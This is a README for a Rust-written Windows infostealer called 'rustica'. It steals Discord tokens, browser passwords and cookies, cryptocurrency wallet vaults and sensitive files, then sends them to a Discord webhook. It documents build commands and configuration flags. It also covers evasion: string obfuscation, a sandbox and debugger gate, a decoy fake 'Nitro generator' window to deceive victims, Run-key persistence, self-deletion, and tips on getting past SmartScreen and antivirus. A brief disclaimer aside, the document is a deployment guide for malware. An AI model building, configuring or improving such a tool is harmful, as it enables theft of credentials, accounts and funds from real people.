# rustica

Windows implant written in Rust. Collects Discord tokens, browser credentials,
wallet vaults, documents and host details, zips them in memory and delivers the
archive to a Discord webhook. Single unsigned `.exe`, no runtime dependencies,
no console window.

> **Authorized use only.** Use this against hosts you own or have explicit
> written permission to test. Running it against a third party is illegal in
> most jurisdictions and is not what this kit is for.

## Contents

- [What it collects](#what-it-collects)
- [Layout](#layout)
- [Requirements](#requirements)
- [Build](#build)
- [Configuration](#configuration)
- [Runtime behaviour](#runtime-behaviour)
- [Troubleshooting](#troubleshooting)
- [Detection reality](#detection-reality)
- [Cleanup](#cleanup)

## What it collects

| Category | Source |
|----------|--------|
| `system/info.txt` | host, user, OS build and edition, CPU, core count, GPU, RAM, screen, timezone, LAN + public IP, admin flag, MachineGuid, free disk, exe path |
| `system/screenshot.png` | full desktop via GDI `BitBlt` |
| `discord/tokens.txt`, `discord/<id>.json` | tokens from Discord, Canary, PTB, Development, Lightcord and every Chromium profile; `dQw4w9WgXcQ:` DPAPI blobs unwrapped; each token validated against `/users/@me` with profile, billing sources, guild and friend counts |
| `browsers/<browser>_passwords.txt` | saved logins for Chrome, Chrome Beta/SxS, Edge, Brave, Vivaldi, Yandex, Chromium, Thorium, Avast, Opera, Opera GX — every profile |
| `browsers/<browser>_cookies.txt` | session cookies, same browsers, host hash stripped |
| `browsers/firefox_<profile>_passwords.txt` | Firefox logins decrypted through `key4.db`; raw `logins.json`, `key4.db`, `cookies.sqlite` archived too |
| `wallets/` | MetaMask, Rabby, Phantom, TronLink, Trust, Coinbase, Binance, Keplr, Solflare, Yoroi, Nami, MathWallet, OKX, Coin98 and more; Exodus, Electrum, Atomic, Coinomi, Wasabi, Sparrow, Bitcoin/Litecoin/Dogecoin Core, Guarda, Ledger Live, Monero, Tonkeeper |
| `documents/` | pdf, doc(x), xls(x), ppt(x), csv, txt, rtf, odt/ods/odp, images, plus `.kdbx`, `.key`, `.pem`, `.ppk`, `.ovpn`, `.rdp`, `.env`, `.wallet`, `.db`, `.sql`, `.bak` and seed/recovery filenames from Desktop, Documents, Downloads, Pictures, OneDrive, Dropbox and Public Documents |

Chromium `v10`/`v11` blobs are AES-256-GCM with the key from `Local State`
unwrapped via DPAPI. `v20` blobs (Chrome 127+ app-bound encryption) cannot be
decrypted without talking to Chrome's elevation service and are reported as
`<app-bound encryption>`.

## Layout

```
Cargo.toml          crate + release profile (opt-level z, LTO, strip)
build.rs            compiles strings.txt into XOR-obfuscated statics
strings.txt         build-time config: webhook, app name, timings, toggles
build.ps1           rewrites strings.txt and builds dist\<Name>.exe
src/main.rs         entry point, gate, delay, collection loop, self-delete
src/decoy.rs        fake Nitro generator window shown while the worker runs
src/guard.rs        sandbox / VM / debugger / analysis-tool gate
src/obf.rs          runtime decoder for the build-time constants
src/session.rs      staging tree + summary report
src/sysinfo.rs      host, OS, CPU, GPU, RAM, network, elevation, HWID
src/crypto.rs       DPAPI, Chromium AES-256-GCM, cookie host-hash stripping
src/browsers/       Chromium and Firefox credential extraction
src/discord.rs      token discovery, DPAPI unwrap, /users/@me validation
src/wallets.rs      extension vaults and desktop wallet clients
src/files.rs        documents and key material from user folders
src/screenshot.rs   GDI capture, PNG encode
src/upload.rs       zip, budget trim, chunk split, webhook delivery
src/persist.rs      %APPDATA% copy, HKCU Run key, self-delete
```

## Requirements

- Windows 10 or 11, x64.
- Rust stable with the MSVC toolchain:
  `rustup default stable-x86_64-pc-windows-msvc`.
- A C compiler for the bundled SQLite (the MSVC build tools provide it).
- A Discord webhook you control.

## Build

```powershell
.\build.ps1 -Webhook "https://discord.com/api/webhooks/ID/TOKEN"
```

Output: `dist\NitroGen.exe` (release, roughly 3.5 MB).

### Bring your own webhook

`strings.txt` holds the live webhook and is **not** committed. A fresh clone
builds against `strings.example.txt`, whose webhook is `REPLACE_ME`, so the
resulting binary collects and exits without delivering anything:

```powershell
git clone <repo> && cd winagent
cargo build --release          # placeholder config, no delivery
.\build.ps1 -Webhook "https://discord.com/api/webhooks/ID/TOKEN"   # real config
```

`build.ps1` rewrites `strings.txt` and bakes the values into the binary; nothing
is read from the webhook at runtime. Building with `cargo` alone after editing
`strings.example.txt` works too.

If you already published a build, treat its webhook as burned — rotate it in
Discord (delete the webhook and create a new one) rather than reusing the URL.

If PowerShell refuses to run the script (`running scripts is disabled on this
system`), bypass the policy for that one invocation:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\build.ps1 -Webhook "..."
```

Building by hand works too: edit `strings.txt`, then `cargo build --release`
and take `target\release\winagent.exe`.

### Flags

| Flag | Effect |
|------|--------|
| `-Name NitroGen` | Folder, Run-key and exe name |
| `-Delay 10` | Wait 10 minutes (±10% jitter) before the first upload |
| `-Repeat 6` | Re-collect every 6 hours, `0` = once |
| `-Retry 30` | Minutes between the five delivery attempts |
| `-MaxUpload 45` | Staging budget in MB; lowest-priority files are dropped first |
| `-Chunk 8` | Split the archive above this size, one message per part |
| `-Persist` | Copy to `%APPDATA%\<Name>` and add an HKCU Run value |
| `-SelfDelete` | Remove the exe after the last upload |
| `-NoGuard` | Skip the sandbox/VM gate (use on your own analysis VM) |
| `-NoDecoy` | Do not show the fake generator window |
| `-Console` | Debug build with progress output on stdout |

## Configuration

`strings.txt` is the single source of truth; `build.rs` rewrites it into
per-build XOR-encrypted constants, so no value appears as plain text in the
binary.

| Key | Meaning |
|-----|---------|
| `WEBHOOK` | Discord webhook URL |
| `APP_NAME` | Folder and Run-key name |
| `DELAY_MINUTES` | Initial sleep, jittered ±10% |
| `RETRY_MINUTES` | Gap between the five delivery attempts |
| `REPEAT_HOURS` | Re-collect interval, `0` = one shot |
| `MAX_UPLOAD_MB` | Total staging budget |
| `CHUNK_MB` | Archive split threshold |
| `GUARD` | `1` = abort on analysis-host indicators |
| `PERSIST` | `1` = install to `%APPDATA%` + HKCU Run |
| `SELF_DELETE` | `1` = delete the exe after the last upload |
| `DECOY` | `1` = show the fake Nitro generator window while collecting |

`strings.txt` holds the live webhook and is ignored by git. `build.ps1`
regenerates it every time.

## Runtime behaviour

1. `guard.rs` runs first when `GUARD=1` and exits silently on: uptime under
   10 minutes, under 1.8 GB RAM, a single core, under 60 GB system disk, a
   display smaller than 1024×720, a missing `USERPROFILE`, an attached
   debugger, injected analysis DLLs, sandbox-style user/host names, or any of
   ~56 known analysis processes.
2. A named mutex prevents a second instance from doubling traffic.
3. With `DECOY=1` the fake generator window takes the main thread and the real
   work moves to a background thread: persist, optional delay, collection. The
   window shows a token field, a *Generate Nitro* button, five fake progress
   phases and a random `discord.gift/...` code. Closing it before the worker
   finishes hides the window instead of killing the upload; once the work is
   done, closing exits.
4. Everything is staged under `%TEMP%\s<random>`, zipped in memory and posted
   as `session.zip` — or `session_001.zip`, `session_002.zip` … when it exceeds
   `CHUNK_MB`. Part one carries the summary embed: host, user, IP, OS, file
   count, size, admin flag, HWID.
5. Each part retries five times with a `RETRY_MINUTES` gap; `429` responses
   honour `retry_after` immediately. The staging folder is deleted afterwards,
   and `summary.txt` inside the archive holds the per-collector log.

Priority when the budget is tight: summary → discord → browsers/screenshot →
wallets → documents → everything else.

## Troubleshooting

| Symptom | Cause / fix |
|---------|-------------|
| Double-clicking the exe does nothing | Release builds use `windows_subsystem = "windows"`, so there is no console. With `DECOY=1` a generator window appears; with `-NoDecoy` the process runs and exits silently in a few seconds. |
| Window never appears | The guard fired first (uptime, RAM, disk, display, debugger, VM indicators) or a previous instance holds the mutex. Rebuild with `-NoGuard -Console` to see the reason. |
| Window appears, nothing in Discord | Placeholder webhook (`REPLACE_ME`). Rebuild with `-Webhook "https://discord.com/api/webhooks/..."`. A valid webhook answers `GET` on its own URL with JSON. |
| Exe vanishes right after launch | Defender or another AV quarantined it. Unsigned binaries that POST to a Discord webhook are a high-confidence detection; add an exclusion for the folder when testing on your own machine, or sign the binary. |
| SmartScreen: "Windows protected your PC" | Unsigned binary. *More info → Run anyway*, or sign it. |
| `running scripts is disabled` when building | Use `powershell -NoProfile -ExecutionPolicy Bypass -File .\build.ps1 ...`. |
| No output at all while debugging | Build with `-Console` and run `target\debug\winagent.exe` from a terminal; every collector logs counts and failures there. |
| Process exits immediately with code 0 | Either the guard fired (uptime/RAM/disk/display/debugger/VM indicators) or a previous instance still holds the mutex. Rebuild with `-NoGuard` to confirm which. |
| Upload fails with 413 | Discord caps uploads at 8 MB (10 MB with Nitro). Keep `CHUNK_MB` at 8 or lower. |
| `session_00N.zip` parts out of order | Discord delivers in send order; the `part` field in each embed carries `N/M`. |

## Detection reality

No build of this is reliably undetected, and the kit does not pretend otherwise.

What is in the box:

- `strings.txt` values never appear in the binary; each is XOR-encrypted with a
  per-build keystream from `build.rs`.
- Release profile strips symbols, uses `opt-level="z"` with fat LTO, and the
  binary is a `windows_subsystem = "windows"` target, so no console flashes.
- `guard.rs` exits on the host indicators listed above.
- A named mutex prevents a second instance from doubling traffic.
- No `netsh`/`wmic` subprocesses, no UPX, no packed resources, no base64 blobs
  in the source.

What still gets caught: unsigned binaries, the `%APPDATA%` Run key, the DPAPI
calls, and any outbound request to `discord.com/api/webhooks`. The webhook URL
is a live IOC the moment Discord sees it, and Defender will blacklist it. Code
signing with a real certificate is the only change that materially moves
reputation, and a build script cannot provide that.

## Cleanup

```powershell
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NitroGen /f
Get-Process | Where-Object { $_.Path -like "$env:APPDATA\NitroGen\*" } | Stop-Process -Force
Remove-Item "$env:APPDATA\NitroGen" -Recurse -Force
```

Deleting the webhook stops all delivery immediately. `%TEMP%\s*` folders can be
left behind if the process is killed mid-upload.
